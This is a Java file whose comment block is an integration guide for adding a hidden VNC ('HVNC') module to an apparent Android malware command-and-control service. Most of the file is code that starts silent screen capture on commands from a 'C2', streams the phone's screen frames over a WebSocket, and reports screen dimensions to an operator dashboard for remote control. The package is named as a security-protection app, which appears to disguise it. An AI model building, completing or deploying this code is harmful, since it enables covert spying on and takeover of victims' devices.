package com.seguranca.protecao.hvnc;

/**
 * ═══════════════════════════════════════════════════════════════
 *  INTEGRATION PATCH — CommandControlService.java
 *  Apply these changes to wire HvncController into your existing
 *  CommandControlService. Lines are annotated with the section
 *  they belong to in the existing file.
 * ═══════════════════════════════════════════════════════════════
 *
 * CHANGE 1 — Add import at top of CommandControlService.java:
 *
 *   import com.seguranca.protecao.hvnc.HvncController;
 *   import okio.ByteString;
 *
 *
 * CHANGE 2 — Add field to CommandControlService class:
 *
 *   private HvncController hvncController;
 *   // Store MediaProjection result for HVNC
 *   private int    mpResultCode;
 *   private Intent mpData;
 *
 *
 * CHANGE 3 — In your onStartCommand or wherever the WebSocket
 *            connection is set up, after creating the WebSocket:
 *
 *   hvncController = new HvncController(this, webSocket);
 *
 *
 * CHANGE 4 — In your WebSocket onOpen callback, after storing
 *            the webSocket reference:
 *
 *   if (hvncController != null) {
 *       hvncController.updateWebSocket(webSocket);
 *   }
 *
 *
 * CHANGE 5 — In your onMessage callback, change the HVNC
 *            command handlers inside the switch/if-else block.
 *            Find the existing START_SILENT_VNC and STOP_SILENT_VNC
 *            handlers and replace them with:
 *
 *   case "START_SILENT_VNC":
 *   case "START_VNC":
 *   case "TOGGLE_VNC": {
 *       if (hvncController != null && mpData != null) {
 *           hvncController.start(mpResultCode, mpData);
 *           // Report capture dimensions back to C2
 *           JSONObject info = new JSONObject();
 *           info.put("type", "event");
 *           JSONObject d = new JSONObject();
 *           d.put("event", "VNC_STARTED");
 *           d.put("width",  hvncController.getCaptureWidth());
 *           d.put("height", hvncController.getCaptureHeight());
 *           info.put("data", d);
 *           webSocket.send(info.toString());
 *       }
 *       break;
 *   }
 *
 *   case "STOP_SILENT_VNC":
 *   case "STOP_VNC": {
 *       if (hvncController != null) {
 *           hvncController.stop();
 *       }
 *       break;
 *   }
 *
 *   case "SET_SILENT_VNC_QUALITY":
 *   case "SET_VNC_MODE": {
 *       int q = args != null ? args.optInt("quality", 50) : 50;
 *       if (hvncController != null) {
 *           hvncController.setQuality(q);
 *       }
 *       break;
 *   }
 *
 *   case "FORCE_RESTART_VNC": {
 *       if (hvncController != null) {
 *           hvncController.restart();
 *       }
 *       break;
 *   }
 *
 *
 * CHANGE 6 — Store MediaProjection result. In whatever Activity
 *            handles the MediaProjection permission (usually in
 *            onActivityResult or the ActivityResultLauncher):
 *
 *   // Save for HvncController
 *   mpResultCode = resultCode;
 *   mpData       = data;
 *   // If HVNC was requested before permission was granted:
 *   if (hvncController != null) {
 *       hvncController.start(resultCode, data);
 *   }
 *
 *
 * CHANGE 7 — Remove old base64/JSON VNC frame sending code.
 *            The HvncEngine sends binary frames directly.
 *            Look for code like:
 *
 *   // OLD (remove this):
 *   String b64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
 *   JSONObject msg = new JSONObject();
 *   msg.put("type", "vnc_frame");
 *   msg.put("data", b64);
 *   webSocket.send(msg.toString());
 *
 *   // NOTHING replaces it — HvncEngine.processFrame() does this:
 *   webSocket.send(ByteString.of(jpeg));  // already implemented
 *
 *
 * CHANGE 8 — In onDestroy / cleanup:
 *
 *   if (hvncController != null) {
 *       hvncController.stop();
 *       hvncController = null;
 *   }
 *
 *
 * CHANGE 9 — In WebSocket.Listener.onMessage, the server now sends
 *            commands as binary frames (future) or text JSON (current).
 *            Your existing text JSON handler is fine — no change needed.
 *            But add this override if not present:
 *
 *   @Override
 *   public void onMessage(WebSocket webSocket, ByteString bytes) {
 *       // Server currently doesn't send binary — forward to text handler
 *       // if it ever does (future protocol upgrade)
 *       onMessage(webSocket, bytes.utf8());
 *   }
 *
 * ═══════════════════════════════════════════════════════════════
 *  DEVICE INFO — send frame dimensions to dashboard on connect
 *  so the HVNC viewer knows how to map coordinates correctly.
 * ═══════════════════════════════════════════════════════════════
 *
 * In your handshake/device_info JSON builder, add:
 *
 *   WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
 *   DisplayMetrics dm = new DisplayMetrics();
 *   wm.getDefaultDisplay().getRealMetrics(dm);
 *
 *   deviceInfo.put("screen_w",  dm.widthPixels);
 *   deviceInfo.put("screen_h",  dm.heightPixels);
 *   // HvncEngine captures at 360px wide, proportional height:
 *   deviceInfo.put("hvnc_w",    360);
 *   deviceInfo.put("hvnc_h",    (int)(360f * dm.heightPixels / dm.widthPixels));
 *
 * ═══════════════════════════════════════════════════════════════
 * This patch file is documentation only — it is not compiled.
 * ═══════════════════════════════════════════════════════════════
 */
public class CommandControlService_HvncPatch {
    // Documentation file — no executable code
    private CommandControlService_HvncPatch() {}
}
